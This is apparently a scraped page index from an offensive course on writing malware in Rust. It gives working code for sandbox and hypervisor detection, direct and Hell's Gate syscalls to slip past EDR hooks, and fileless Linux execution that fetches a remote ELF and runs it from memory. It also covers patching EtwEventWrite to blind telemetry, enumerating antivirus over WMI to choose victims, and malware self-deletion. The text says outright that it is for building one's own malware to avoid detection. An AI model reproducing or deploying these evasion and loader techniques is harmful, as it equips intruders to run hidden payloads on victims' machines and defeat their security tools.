flag🔗\nThe virtualization flag is present at the 31st bit of RCX with RAX set to 1 when calling CPUID.\nHere's the function that retrieves the virtualization flag:\nfn check_is_run_in_hypervisor() -&gt; bool {\n    let mut res: u64;\n    unsafe {\n        asm!(\n            \"xor rcx, rcx\",\n            \"mov rax, 0x1\",\n            \"cpuid\",\n            \"mov r8, rcx\",\n            out(\"r8\") res,\n        );\n    }\n\n    let hypervisor_bit = (res &gt;&gt; 31) &amp; 0x1 == 1;\n    println!(\"- HYPERVISOR BIT: {}\", hypervisor_bit);\n    return hypervisor_bit;\n}\n\nThe following function uses the asm macro to set RAX to 1, using CPUID. To retrieve the value of RCX from this macro, we copy this value into register R8 and retrieve it from variable res with out(\"r8\") res.\nFinally, the bit value is retrieved using a Boolean operation.\nHypervisor name retrieval🔗\nThe RAX value for retrieving the hypervisor name is 0x40000000. The hypervisor name is returned as a small byte in the EBC, ECX and EDX registers.\nThis feature works differently on Windows: it returns whether a hypervisor is installed on the system, which is often the case after several tests. The hypervisor returned is Hyper-V.\nHere's the list of hypervisors we're looking for:\nconst HYPERVISORS_NAMES: [&amp;str; 13] = [\n    \"bhyve bhyve \",\n    \"KVMKVMKVM\\0\\0\\0\",\n    \"TCGTCGTCGTCG\",\n    \"Microsoft Hv\",\n    \"MicrosoftXTA\",\n    \" lrpepyh  vr\",\n    \"VMwareVMware\",\n    \"XenVMMXenVMM\",\n    \"ACRNACRNACRN\",\n    \" QNXQVMBSQG \",\n    \"GenuineIntel\",\n    \"VirtualApple\",\n    \"VBoxVBoxVBox\",\n];\n\nAnd the function that retrieves the hypervisor name and checks whether it's in the previous list:\nfn check_hypervisor_name() -&gt; bool {\n    let mut part1: u64;\n    let mut part2: u64;\n    let mut part3: u64;\n    unsafe {\n        asm!(\n            \"mov rax, 0x40000000\",\n            \"cpuid\",\n            \"mov r8, rbx\",\n            \"mov r9, rcx\",\n            \"mov r10, rdx\",\n            out(\"r8\") part1,\n            out(\"r9\") part2,\n            out(\"r10\") part3,\n        );\n    }\n\n    // rbx\n    let tmp = &amp;part1.to_le_bytes()[0..4];\n    let name = match std::str::from_utf8(tmp) {\n        Err(_) =&gt; return false,\n        Ok(v) =&gt; v,\n    };\n\n    // rcx\n    let tmp = &amp;part2.to_le_bytes()[0..4];\n    let name = match std::str::from_utf8(tmp) {\n        Err(_) =&gt; return false,\n        Ok(v) =&gt; format!(\"{}{}\", name, v),\n    };\n\n    // rdx\n    let tmp = &amp;part3.to_le_bytes()[0..4];\n    let name = match std::str::from_utf8(tmp) {\n        Err(_) =&gt; return false,\n        Ok(v) =&gt; format!(\"{}{}\", name, v),\n    };\n\n    println!(\n        \"- HYPERVISOR NAME: {} (is hypervisor: {})\",\n        name,\n        HYPERVISORS_NAMES.contains(&amp;name.as_str())\n    );\n    return HYPERVISORS_NAMES.contains(&amp;name.as_str());\n}\n\nThis code calls CPUID with RAX set to 0x40000000, then retrieves the EBC, ECX and EDX registers from variables part1, part2 and part3 respectively.\nThen, for each of these variables, we retrieve its value from the little loop and transform the result into a character string.\nWe then check whether the result is in the list of hypervisors we're looking for.\nNote that on Windows, the name of the installed hypervisor is returned if we are not virtualized.\nResult🔗\nUsing the various functions seen in this section, we have the following program:\nfn main() {\n    println!(\"CPUID :\");\n    let cpuid_flag: bool = cpuid_check();\n\n    println!(\"PROCESSUS :\");\n    let processus_flag: bool = processus_check();\n\n    println!(\"MAC ADRESSES :\");\n    let mac_adresses_flag: bool = mac_addresses_check();\n\n    #[cfg(target_os = \"windows\")]\n    if cpuid_flag &amp;&amp; (processus_flag || mac_adresses_flag) {\n        println!(\"\\nResult: In a Sandbox !\");\n        return;\n    }\n\n    #[cfg(target_os = \"linux\")]\n    if cpuid_flag || processus_flag || mac_adresses_flag {\n        println!(\"\\nResult: In a Sandbox !\");\n        return;\n    }\n\n    println!(\"\\nResult: Not in a Sandbox !\");\n}\n\nAs virtualization flag retrieval doesn't always work as expected (giving true if a hypervisor is installed and true if our program is virtualized), the cpuid_check function doesn't use this feature:\npub fn cpuid_check() -&gt; bool {\n    #[cfg(target_os = \"linux\")]\n    return check_hypervisor_name() | check_is_run_in_hypervisor();\n    #[cfg(target_os = \"windows\")]\n    return check_hypervisor_name();\n}\n\nWhat's more, since Windows can return the name of the hypervisor installed without being virtualized, we don't fully trust this feature. We therefore rely on the other features to confirm that we are in a sandbox.\nHere are some screenshots of the program running on the various possible environments:\nLinux VM:\n\nLinux barebone:\nWindows VM:\n\nWindows barebone:\n\n","id":" https://nu11busters.github.io/rust-maldev-course/evasion/detect-sandbox/","title":"Detect sandbox"}," https://nu11busters.github.io/rust-maldev-course/evasion/direct-syscalls/":{"body":"In this part of the course, we'll look at how to interact directly with the Windows and Linux operating system kernels to escape the surveillance of security solutions. \nSystem calls are essential interfaces between processes and the operating system kernel for the purpose of interacting with system resources.\nHere is a diagram from RedHat:\n\nIn concrete terms, a system call generally consists of two assembly instructions:\n\nOne to set the system call number in the rax register\nThen one to trigger the system call with the syscall instruction.\n\nTo set the system call arguments, this is generally done via other registers (rdi, rsi, etc.) on Linux and directly on the stack on Windows, upstream of the syscall instruction.\nWe use them constantly without realizing it, because we use libraries that serve as interfaces for these system calls, notably \"libc\" or the \"Windows API\".\nIn this course, we'll look at how to call them without going through these libraries, whose calls are monitored by security solutions.\nTo simplify our example, we'll demonstrate the use of a system call with the following program:\nfn main() {\n    println!(\"Hello, world!\");\n    system_call_exit();\n    println!(\"You shouldn't see me !\");\n}\n\nLinux🔗\nThe system calls on Linux are the easiest to use and the most documented. You can find them all on this site: https://x64.syscall.sh/.\nThe one we're going to use is simply called exit, identified by the number 60. Here's how it's called in assembler:\n; exit(0)\n\nmov rdi, 0\nmov rax, 60\nsyscall\n\nWindows🔗\nUnlike Linux, system calls are more complicated to use and not officially documented. You can get an up-to-date list with their numbers at this site: https://hfiref0x.github.io/NT10_syscalls.html.\nThe one that terminates a process is called NtTerminateProcess, with number 44. For this system call, we're in luck, as it's the same for every version. But if you looked at the link given just before, you'll have noticed that for the majority of system calls, the number changes with EACH version of Windows, which means we'll have to update our code each time.\nFor the arguments, it will look for the arguments on stack, so we'll need to place the instructions in a function with the following prototype given in the Microsoft documentation:\n\nThe assembler instructions are as follows:\nmov r10, rcx\nmov eax, 44\nsyscall\n\nThe r10, rcx instruction is required by Windows to save a state.\nAssembly in Rust🔗\nTo call these assembler instructions in Rust, we'll use the global_asm macro, which takes arguments directly from the assembler in a character string.\nInside, we'll write the assembler functions that will make the system calls.\nThen, all we have to do is define the prototypes of our Rust functions to call them, and we're ready to go.\nHere's the source code that does it all:\nuse std::arch::global_asm;\n\n#[cfg(target_os = \"windows\")]\nuse windows::Win32::{Foundation::HANDLE, System::Threading::GetCurrentProcess};\n\nglobal_asm!(\n    \"\nwindows_exit:\n    mov r10, rcx\n    mov eax, 44\n    syscall\n    ret\n\nlinux_exit:\n    mov rdi, 0\n    mov rax, 60\n    syscall\n    ret\n\"\n);\n\n#[cfg(target_os = \"windows\")]\nextern \"C\" {\n    pub fn windows_exit(handle: HANDLE, status: i32) -&gt; i32;\n}\n\n#[cfg(target_os = \"linux\")]\nextern \"C\" {\n    pub fn linux_exit() -&gt; i32;\n}\n\nfn main() {\n    println!(\"Hello, world!\");\n    unsafe {\n        #[cfg(target_os = \"windows\")]\n        windows_exit(GetCurrentProcess(), 99);\n\n        #[cfg(target_os = \"linux\")]\n        linux_exit();\n    }\n    println!(\"You shouldn't see me !\");\n}\n\nConclusion🔗\nNow you know how to make your own system calls and bypass the EDRs that monitor calls to system libraries.\nHowever, there's still a problem on the Windows side: the system call numbers change with each kernel version, which is very problematic, but there are techniques we'll look at in this course for implementing workarounds.\n","id":" https://nu11busters.github.io/rust-maldev-course/evasion/direct-syscalls/","title":"Direct syscall"}," https://nu11busters.github.io/rust-maldev-course/evasion/fileless-execution/":{"body":"In this section, we'll look at a Linux escape method that allows you to execute a file on the system using only process memory.\nThis method uses the memfd_create function available in libc to create a file in memory. We'll then write an ELF file to this file, which we'll retrieve, in the following example, from an HTTP server.\nTo use the memfd_create function, we'll use the crate libc and to make HTTP requests we'll use the reqwest library with the blocking feature, which allows us to access blocking functions (reqwest uses asynchronous functions by default):\n&gt;&gt;&gt; cargo add libc\n&gt;&gt;&gt; cargo add reqwest --features=blocking\n\nHere are our dependencies in our Cargo.toml file:\n[dependencies]\nlibc = \"0.2.151\"\nreqwest = { version = \"0.11.23\", features = [\"blocking\"] }\n\nHere's our program:\nuse std::ffi::CString;\nuse libc::{memfd_create, write, execve, c_void, c_char, MFD_CLOEXEC};\n\nfn main() {\n    let args: Vec&lt;string&gt; = std::env::args().collect();\n    if args.len() != 2 {\n        eprintln!(\"Usage: {} &lt;ELF URL&gt;\", args.get(0).unwrap());\n        return \n    }\n\n    // Retrieves the ELF file\n    let url = args.get(1).unwrap();\n    let client = reqwest::blocking::Client::builder()\n        .danger_accept_invalid_certs(true)\n        .build()\n        .unwrap();\n    let content = client.get(url).send().expect(\"Could not get ELF from server\").bytes().unwrap();\n\n    // Create the memfd\n    let file_name_tmp = CString::new(\"a.out\").unwrap();\n    let file_name = file_name_tmp.as_ptr();\n\n    let fd = unsafe { memfd_create(file_name, MFD_CLOEXEC) };\n    if fd == -1 {\n        eprintln!(\"Could not create memfd\");\n        return\n    }\n\n    // writes ELF contents to memfd file\n    let written = unsafe {\n        write(fd, content.to_vec().as_ptr() as *const c_void, content.len())\n    };\n\n    if written == 0 {\n        eprintln!(\"Could not write to file descriptor\");\n    }\n\n    let elf_path = CString::new(format!(\"/proc/self/fd/{}\", fd)).unwrap();\n\n    unsafe {\n        execve(elf_path.as_ptr() as *const c_char, std::ptr::null(), std::ptr::null());\n    }\n}\n\nIt first retrieves the ELF file from the HTTP server using the reqwest library, the URL in this example being specified as an argument.\nWe're using a blocking HTTP client here, as we want to know what's in the file (and whether we can get it) before proceeding with any other action.\nIt then calls the memfd_create function and populates the file it returns with the ELF file.\nIt's important to note that calling memfd_create requires 2 parameters:\n\nthe file name, this parameter is only useful for debugging purposes; here, we'll simply set it to \"a.out\".\nflags, which can be similar to those available with the open call, here we only use MFD_CLOEXEC, which indicates that the file returned by memfd_create will be closed when an exec is called (execve, for example).\n\nOnce the ELF file has been written to memory, we'll execute it using execve, the file being available in the special /proc folder, which allows access to the memfd_create file as if it were on disk.\nFor the sake of concealment, we don't specify any of the other parameters, which means we won't be visible in the process list. As the current process will be overwritten by execve, there will be no trace of this process.\nDemonstration🔗\nWe'll run the following program (it-works.c) to demonstrate that our program works:\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nint main() {\n    puts(\"It works!\");\n    printf(\"PID: %d\\n\", getpid());\n    return 0;\n}\n\n&gt;&gt;&gt; gcc it-works.c -o it-works\n&gt;&gt;&gt; ./it-works \nIt works!\nPID: 40525\n\nThis program can be accessed via the URL \"http://localhost:8000/it-works\".\nHere's how it looks when our program is launched and the binary is retrieved:\n&gt;&gt;&gt; cargo run http://localhost:8000/it-works\n    Finished dev [unoptimized + debuginfo] target(s) in 0.03s\n     Running `target/debug/memfd_exec 'http://localhost:8000/it-works'`\nIt works!\nPID: 40664\n\n","id":" https://nu11busters.github.io/rust-maldev-course/evasion/fileless-execution/","title":"Fileless on Linux"}," https://nu11busters.github.io/rust-maldev-course/evasion/hells/":{"body":"In the conclusion of our course on direct system calls, we encountered a limitation with Windows, as the system call numbers change with each kernel version. This makes our technique cumbersome to use since it requires updating our malware with each version or using the \"Syswhisperer\" technique that involves storing known numbers based on the version. However, neither of these solutions is very practical.\nTo overcome this problem, we will dynamically retrieve our system call numbers using the \"Hell's Gate\" technique, initially published by am0nsec. This technique simply builds on the other two techniques we've seen, direct system calls and hook detection.\nImplementation of Hell's Gate Technique🔗\nFor our implementation of this technique, similar to hook detection, we will retrieve the address of the \"Nt*\" function in the \"ntdll.dll\" module to read the opcodes contained in the function. Instead of looking for the pattern \"mov r10, rcx; mov eax, XX\", we will only retrieve the number XX placed in \"eax\", which is a two-byte integer.\nHere is the Rust code to retrieve the system call number for \"NtTerminateProcess\":\nuse anyhow::{bail, Result};\nuse std::{ptr, mem::transmute};\nuse windows::Win32::Foundation::GetModuleHandleA;\nuse windows::Win32::System::LibraryLoader::GetProcAddress;\n\nfn main() -&gt; Result&lt;()&gt; {\n    unsafe {\n        let handle = GetModuleHandleA(s!(\"ntdll.dll\"))?;\n        let stub = match GetProcAddress(handle, s!(\"NtTerminateProcess\")) {\n            Some(a) =&gt; ptr::read(a as *const [u8; 8]),\n            None =&gt; bail!(\"Function not in module.\"),\n        };\n\n        // stub = mov r10, rcx; mov eax, XX\n        // stub = 76, 139, 209, 184, XX, XX, 00, 00\n        let syscall_nb = u16::from_ne_bytes(stub[4..6].try_into()?);\n    }\n\n    Ok(())\n}\n\nNext, we need to execute our system call as in our direct system call course, but with the peculiarity of inserting our system call number.\nTo do this, we will need to adapt the content of our assembly code to take the system call number as an argument. We will reuse an implementation from memN0ps:\nglobal_asm!(\n    \"\ndo_syscall:\n    mov [rsp - 0x8],  rsi\n    mov [rsp - 0x10], rdi\n\n    mov eax, ecx\n    mov rcx, rdx\n\n    mov r10, r8\n    mov rdx, r9\n\n    mov  r8,  [rsp + 0x28]\n    mov  r9,  [rsp + 0x30]\n\n    sub rcx, 0x4\n    jle skip\n\n    lea rsi,  [rsp + 0x38]\n    lea rdi,  [rsp + 0x28]\n\n    rep movsq\nskip:\n    syscall\n\n    mov rsi, [rsp - 0x8]\n    mov rdi, [rsp - 0x10]\n\n    ret\n\"\n);\n\nextern \"C\" {\n    pub fn do_syscall(ssn: u16, n_args: u32, ...) -&gt; i32;\n}\n\nHere, our do_syscall function takes as arguments the system call number, the number of arguments the system call takes, and then the actual arguments.\nIt will save the values of the rdi and rsi registers on the stack, then rearrange the proper values in the correct registers. First, it places the system call number in rax, then places the first four arguments in their respective registers according to the fastcall convention: rcx, rdx, r8, and r9. If there are more than four arguments, the others are placed in reverse order on the stack.\nFull Example\nNow, let's assemble everything and reproduce the example of displaying \"You shouldn't see me\" after calling \"NtTerminateProcess\" to demonstrate the functionality of our technique:\nuse anyhow::{bail, Result};\nuse std::{ptr, mem::transmute};\nuse windows::Win32::Foundation::GetModuleHandleA;\nuse windows::Win32::System::LibraryLoader::GetProcAddress;\n\nglobal_asm!(\n    \"\ndo_syscall:\n    mov [rsp - 0x8],  rsi\n    mov [rsp - 0x10], rdi\n\n    mov eax, ecx\n    mov rcx, rdx\n\n    mov r10, r8\n    mov rdx, r9\n\n    mov  r8,  [rsp + 0x28]\n    mov  r9,  [rsp + 0x30]\n\n    sub rcx, 0x4\n    jle skip\n\n    lea rsi,  [rsp + 0x38]\n    lea rdi,  [rsp + 0x28]\n\n    rep movsq\nskip:\n    syscall\n\n    mov rsi, [rsp - 0x8]\n    mov rdi, [rsp - 0x10]\n\n    ret\n\"\n);\n\nextern \"C\" {\n    pub fn do_syscall(ssn: u16, n_args: u32, ...) -&gt; i32;\n}\n\nfn main() -&gt; Result&lt;()&gt; {\n    println!(\"Hello Hell's gate !\");\n\n    unsafe {\n        let handle = GetModuleHandleA(s!(\"ntdll.dll\"))?;\n        let stub = match GetProcAddress(handle, s!(\"NtTerminateProcess\")) {\n            Some(a) =&gt; ptr::read(a as *const [u8; 8]),\n            None =&gt; bail!(\"Function not in module.\"),\n        };\n\n        let syscall_nb = u16::from_ne_bytes(stub[4..6].try_into()?);\n\n        // NtTerminateProcess\n        do_syscall(syscall_nb, 2, GetCurrentProcess(), 99);\n    }\n\n    println!(\"You shouldn't see me !\");\n\n    Ok(())\n}\n\nWe observe the program execution with success:\n\nConclusion🔗\nYou can now use the direct system call technique without worrying about updating the number with each Windows update.\nHell's Gate is a basic technique but still faces a constraint: if the function is hooked by an EDR, it is no longer possible to retrieve the system call number. This is why subsequent techniques such as \"Halos Gate\" and \"Tartarus Gate\" were published. These techniques bypass this constraint by searching for a neighboring function that is not hooked to recalculate the number from it. Unfortunately, we will not cover these techniques in this course, but you now have the basics of their functioning.\n","id":" https://nu11busters.github.io/rust-maldev-course/evasion/hells/","title":"Hell's Gate"}," https://nu11busters.github.io/rust-maldev-course/evasion/hook-detection/":{"body":"This technique is specific to Windows, and involves the detection of hooks on Windows API functions by security solutions. \nA hook is a piece of code inserted at the beginning of a function normally used in a dynamic library, in order to steal its execution flow. This small feature is used by security solutions, notably EDRs, to monitor calls to these functions and detect their malicious use.\nOn Windows, EDRs generally place their hooks on \"ntdll.dll\" functions, as this is the dynamic library responsible for interfacing with all Windows system calls.\nHere's a diagram of all the functions executed behind the Windows API \"OpenProcess\" function call, by Alice Climent-Pommeret:\n\nSo, in this execution chain, it's the \"NtOpenProcess\" function that's hooked by the EDRs.\nIf we disassemble the function with WinDgb on a system without EDRs, we observe the following: \n\nIf you've just completed the course on direct system calls, you'll be familiar with this instruction set. Here we see syscall number 38 (26h).\nNow, let's take a look at some examples of what the assembly instructions for a function in \"ntdll.dll\" look like with an EDR:\n\n\nHere are two examples of the contents of a function hooked by an EDR. You can see the appearance of a \"jmp\" instruction to code belonging to the EDR.\nWe can see that the hooking techniques are not necessarily exactly the same, but the paterne we find is that it rewrites over the two instructions \"mov R10, rcx\" and \"mov eax, XX\".\nSo, we're going to rely on the presence of these two instructions without them being corrupted to determine whether the function is hooked or not.\nIn our example, we'll check whether the \"NtOpenProcess\" function is hooked:\n# src/main.rs\n\nuse anyhow::{bail, Result};\nuse std::ptr;\nuse windows::{\n    core::s,\n    Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress},\n};\n\nstatic VALID_STUB: [u8; 4] = [76, 139, 209, 184]; // mov r10, rcx; mov eax, XX\n\nfn main() -&gt; Result&lt;()&gt; {\n    unsafe {\n        let handle = GetModuleHandleA(s!(\"ntdll.dll\"))?;\n        let stub = match GetProcAddress(handle, s!(\"NtOpenProcesss\")) {\n            Some(a) =&gt; ptr::read(a as *const [u8; 4]),\n            None =&gt; bail!(\"Function not in module.\"),\n        };\n\n        if stub != VALID_STUB {\n            println!(\"FUNCTION HOOKED\");\n        } else {\n            println!(\"FUNCTION NOT HOOKED\");\n        }\n    }\n\n    Ok(())\n}\n\nHere, we start by defining the list of opcodes representing the start of the \"uncorrupted\" functions.\nNext, we use the \"GetModuleHandleA\" and \"GetProcAddress\" functions to retrieve the address of the \"NtOpenProcess\" function. \nFrom this function address, we'll read the first four bytes and store them in our \"stub\" variable, converting the function pointer into a byte pointer.\nThen all we have to do is compare our stub with our witness variable containing the valid bytes, to determine whether the function is hooked or not.\n\n\nConclusion🔗\nYou now have all you need to dynamically determine whether a function is hooked. Several implementations of this technique involve iterating over all the functions in the \"Export Address Table\" of the \"ntdll.dll\" to enumerate all hooked functions.\nFor your malware, I advise you to check the functions you intend to use in advance, then if they are being monitored, you can opt for direct system calls or unhooking techniques, which unfortunately we won't be looking at in this course.\n","id":" https://nu11busters.github.io/rust-maldev-course/evasion/hook-detection/","title":"Hook detection"}," https://nu11busters.github.io/rust-maldev-course/evasion/patch-etw/":{"body":"To detect potential threats, EDRs can collect information on a Windows system. To retrieve this information, EDRs use ETW (Event Tracing for Windows). ETW is an event-tracking mechanism built into Windows. It is a function for tracing and logging events triggered by applications in user mode and drivers in kernel mode, in a log file. Events can be consumed in real time or from a log file. For example, events can be consumed to debug an application.\nIn this course, we'll be looking to develop a patch to bypass the ETW function. This will prevent our malware, for example, from being detected by EDRs. Contrary to popular belief, ETW is not that difficult to bypass.\nFirst of all, you need to know that in user mode, ETW-related functions have been implemented in ntdll.dll and that ETW can be bypassed during the process.\nWith this information and by disassembling ntdll.dll, we can see that the EtwEventWrite function is commonly called when ETW is used by security products.\nAccording to recent research, the EtwEventWrite function can be patched by returning a simple return when the function is called. Adam Chester has produced some very interesting documentation on the subject (https://blog.xpnsec.com/hiding-your-dotnet-etw/).\nSo we're going to develop a function in Rust, which will enable us to patch the EtwEventWrite function. This function can then be added to the code of an illegitimate program to prevent the creation of ETW events, for example.\nTo do this, you'll need to retrieve the handle of the ntdll.dll, and then the address of the EtwEventWrite function. In Rust, this can be done using the GetModuleHandleA and GetProcAddress functions of the windows crate. To save time later on, I'm going to create a path variable containing an array with an immediate return instruction (ret).\nlet patch = [0xc3];\nlet handle = GetModuleHandleA(s!(\"ntdll.dll\")).unwrap();\nlet etw_addr = GetProcAddress(handle, s!(\"EtwEventWrite\")).unwrap();\n\nNext, we'll try to change the memory permissions at the address of the EtwEventWrite function to enable writing. This step is necessary because we need to be able to obtain write permissions temporarily, to enable the program to write to the location where the EtwEventWrite function is stored in memory.\nif VirtualProtect(\n    etw_addr as *mut c_void,\n    1,\n    PAGE_READWRITE,\n    &amp;mut old_permissions,\n).is_err()\n{\n    panic!(\"[-] Failed to change protection.\");\n}\n\nNow that we have the right to write to memory at the address of the EtwEventWrite function, we'll write a return instruction at the address of the EtwEventWrite function. This instruction replaces the start of the function, resulting in immediate exit without execution of the rest of the function. You can also use the WriteProcessMemory function in the windows crate.\nif WriteProcessMemory(\n    GetCurrentProcess(),\n    etw_addr as *mut c_void,\n    patch.as_ptr().cast(),\n    1,\n    None,\n).is_err()\n{\n    panic!(\"[-] Failed to overwrite function.\");\n}\n\nAll that's left is to restore memory rights to their original state, after our patch has been written. We can reuse the VirtualProtect function to do this.\nif VirtualProtect(\n    etw_addr as *mut c_void,\n    1,\n    old_permissions,\n    &amp;mut old_permissions,\n).is_err()\n{\n    panic!(\"[-] Failed to restore permissions.\");\n}\n\nYou can add this function to your program to patch the ETW. In the code, you'll find an example of a practical case with the ETW function implemented and working, as well as the function itself.\n","id":" https://nu11busters.github.io/rust-maldev-course/evasion/patch-etw/","title":"Patch ETW"}," https://nu11busters.github.io/rust-maldev-course/evasion/query-wmi/":{"body":"The purpose of this section is to present a Rust program that can serve as a basis for executing WMI Queries. The Microsoft and Rust documentation can be useful for this. A simple program will be proposed here and will be responsible for detecting the antivirus solutions present on the victim's machine. Depending on the result of this program, you can decide whether or not to attack the target with a tool or program you have designed and know is not detected by a particular solution. It is also possible to implement this piece of code in a larger program that acts based on the results obtained. This program will be exclusively for Windows, so we will use cross to compile, as seen in one of the previous chapters.\nTo start, you can add the necessary crates via cargo add:\n\ncargo add anyhow\ncargo add wmi\n\nIn the main, you can declare:\n\nuse anyhow::{Ok, Result};\nuse std::time::Duration;\nuse std::{collections::HashMap, thread::sleep};\nuse wmi::{COMLibrary, WMIConnection};\n\nFirst, we will establish a connection using the COMLibrary structure and its new() method. A WMI connection is then established with WMIConnection and the with_namespace_path method. This method will take as a parameter a namespace, which is root\\securitycenter2 in the case of searching for antivirus information, and the previous COM connection. We will store the results of the search performed via raw_query(\"SELECT displayName FROM AntiVirusProduct\") in a vector containing one or more hashmaps. These hashmaps will contain key-value pairs related to the retrieved data. Several conditions are created to retrieve the number of results and the name of the associated antivirus. If only Windows Defender is returned, certain actions can be taken (you can modify the code based on your needs), and if another antivirus solution is installed, we exit the program properly with an Ok(()).\nHere is the code in its entirety:\nSource:\n\n# src/main.rs\nfn main() -&gt; Result&lt;()&gt; {\n    // we initialize the connection to ComLibrary and define the namespace path for our query\n    let com_con = COMLibrary::new()?;\n    let wmi_con = WMIConnection::with_namespace_path(\"root\\\\securitycenter2\", com_con)?;\n\n    // each result from our query will be saved into the results vector and displayed\n    let results: Vec&lt;HashMap&lt;String, String&gt;&gt; =\n        wmi_con.raw_query(\"SELECT displayName FROM AntiVirusProduct\")?;\n\n    if results.len() == 1 &amp;&amp; results[0].get(\"displayName\").unwrap() == \"Windows Defender\" {\n        println!(\"[+] Windows Defender installed\");\n        // if just defender is installed we can continue to execute code because easy to bypass\n        let five = Duration::new(5, 0);\n        sleep(five);\n    } else if results.len() == 2 &amp;&amp; results[0].get(\"displayName\").unwrap() == \"Windows Defender\" {\n        println!(\n            \"[+] Defender installed but {:?} is in use\",\n            results[1].get(\"displayName\").unwrap()\n        );\n    } else {\n        for av in &amp;results {\n            if av.get(\"displayName\").unwrap() == \"Windows Defender\" {\n                continue;\n            } else {\n                println!(\"{:?}\", av.get(\"displayName\").unwrap());\n            }\n        }\n        // if another AV than Defender we can consider the machine \"safe\" and quit gently - The improvement here can be to filter on AV or EDR that you test your malware on and exclude the ones that you can't bypass\n        return Ok(());\n    }\n    Ok(())\n}\n\nAfter execution, we can see the detection of Windows Defender and Avast on our test machine:\n\nThe source code is available in the next section.\n","id":" https://nu11busters.github.io/rust-maldev-course/evasion/query-wmi/","title":"Query wmi"}," https://nu11busters.github.io/rust-maldev-course/home/":{"body":"\n\nIntroduction🔗\nIn this course, we will explore the delicate balance between technical mastery and ethics by delving into the field of malware development. Our main objective will be to highlight the fundamental skills needed to think and act like a malicious actor in the context of IT security.\nIt is important to note that the content of this course will focus exclusively on the offensive dimension of IT security. We will not be looking at malware analysis or detection. However, to assess the effectiveness of our own malware, we will use various malware detection solutions.\nIn the course of this exploration, we'll be taking a deep dive into the Rust programming language, renowned for its robustness and security. This will enable us to understand how to design malicious programs while deepening our knowledge of the underlying mechanisms of programming.\nBe prepared to push back the boundaries of your knowledge while increasing your awareness of the ethical and legal implications of these practices.\n\nWhat's a malware ?🔗\nMalware, which is short for \"malicious software\", is a program designed to cause damage to a computer system.\nMalware is generally created by malicious individuals, and its most common motivations are as follows:\n\nIntelligence and intrusion: Used to extract data such as emails and internal information from companies or individuals, with a particular focus on sensitive data such as passwords.\nDisruption and extortion: Some malware locks down networks and computers, rendering them completely unusable. When these programs take a machine hostage in exchange for a ransom, they are known as ransomware. Malicious individuals demand payment to decrypt the data and make the machine operational again.\nDestruction or vandalism: Other malware aims to destroy computer systems, causing damage to the network infrastructure and consequent financial losses.\nTheft of computing time: Some malware uses the computing power of infected machines to run botnets, cryptomining programmes or to send spam.\n\n\nWhy develop your own malwares ?🔗\nAs part of a red team exercise, penetration test or security audit, a penetrator[6] uses automated tools. The common practice is to use existing tools, whether open-source such as Metasploit or proprietary such as Cobalt-Strike, to enable automated control of target and compromised machines.\nHowever, this raises a major problem. There are risks involved in running programs whose instructions we don't control on our customers' machines. We could be faced with unforeseen behaviour, or even worse, the execution of harmful code hidden either by the publisher itself or by a third party through a provisioning attack (a computer attack on a supplier with lesser security, which enables the target's protections to be bypassed). What's more, most offensive tools are now well known to detection systems such as anti-virus or EDRs, which makes it almost impossible to use them without being detected, especially when using scripts or programs available on GitHub.\nIn the case of open-source tools, it is certainly possible to read the entire code, but this can be complex. The code may be written in a language that is not part of our expertise, or the programme may be riddled with bad practices that make it difficult to decipher.\nIt is also possible to use malware development to raise the level of our services and offer malware similar to that used by real attackers. This approach offers greater control over our actions and a complete understanding of the tool, with the advantage of increasing our chances of going undetected and adapting to each infrastructure on which we carry out an attack.\nHowever, it is essential to remember that this practice must be carried out under strict supervision and rigorous control, in compliance with cybercrime legislation, obtaining the appropriate authorisations from the parties concerned, with great caution and in strict compliance with the laws (and ethics) in force.\n\nWhy develop your malwares in Rust ?🔗\nIn general, offensive tools are developed in programming languages such as C, C++, Python or Java, and more recently in Go. However, each of these languages has limitations that make them less than ideal for the task. It's often more complex to write robust programs in C or C++, Python can be slow, and its weak typing makes it less suitable for large programs. Java depends on a heavy execution environment that may not meet all the requirements when developing malware.\nThis is where Rust, a new programming language, comes in:\nRust is a modern system programming language renowned for its advantages in terms of security and memory management performance. Developed by Mozilla, Rust combines the low-level control of languages like C and C++ with advanced memory management features that prevent common programming errors, such as null pointer dereferences and data races between threads.\nIts ownership and borrowing system applies strict rules at compile time, guaranteeing secure code without the need for a garbage collector. This memory management mechanism automates the release of borrowed memory, relieving developers of this task.\nThere are many advantages to developing malware in Rust:\n\n\nSecurity and Robustness: Rust aims to minimise common programming errors, which can result in malware that is more stable and less prone to unforeseen problems.\n\n\nPerformance: Rust offers performance comparable to that of low-level languages such as C and C++, which is crucial for the development of malware that exploits vulnerabilities or carries out sophisticated attacks.\n\n\nConcurrency and parallelism: If your malware requires the simultaneous manipulation of several processes, Rust offers built-in mechanisms for managing concurrency and parallelism in complete security.\n\n\nAnti-reverse engineering: Due to its relative rarity as a language of choice for malware, analysing binaries written in Rust is more complex than analysing binaries written in C or other more common languages.\n\n\nCross-platform: Rust greatly simplifies cross-platform development, making it possible to write platform-specific code.\n\n\n","id":" https://nu11busters.github.io/rust-maldev-course/home/","title":"Malware development in Rust"}," https://nu11busters.github.io/rust-maldev-course/obfuscation/":{"body":"","id":" https://nu11busters.github.io/rust-maldev-course/obfuscation/","title":"Obfuscation"}," https://nu11busters.github.io/rust-maldev-course/obfuscation/auto-remove/":{"body":"Self-deletion is a feature that some malware can incorporate into their code. This feature enables malware to remove or hide its own presence after having accomplished its main mission, or to avoid detection by security tools.\nThere are several ways to proceed, and they differ according to the platform. First of all, we're going to create the following tree structure, so that we can call up our self-deletion functionality whether we're on Linux or Windows (as seen in the cross-platform section):\n.\n├── Cargo.lock\n├── Cargo.toml\n└── src\n    ├── main.rs\n    ├── linux\n        ├── lib.rs\n        └── mod.rs\n    └── windows\n        ├── lib.rs\n        └── mod.rs\n\nLinux🔗\nOn Linux it's pretty easy, just get the relative path of the executable and delete it. To do this, create the file : \n# src/linux/lib.rs\nA function named :\ndisappear()\nThis function uses the :\ncurrent_exe() \nremove_file()\n\nFrom the crate: std\nThese functions retrieve the executable's relative path and remove it. \nThe result is :\n# src/linux/lib.rs\nuse anyhow::Result;\nuse std::{env::current_exe, fs::remove_file};\n\npub fn disappear() -&gt; Result&lt;()&gt; {\n    let filename = current_exe()?;\n    let _ = remove_file(filename);\n    Ok(())\n}\n\nNow in the file :\nsrc/linux/mod.rs```\nIn order to use the :\ndisappear()\nIn the :\nsrc/main.rs```\nYou need to add the following code:\n# src/linux/mod.rs\nmod lib;\npub use lib::disappear;\n\nWindows🔗\nNow for the Windows 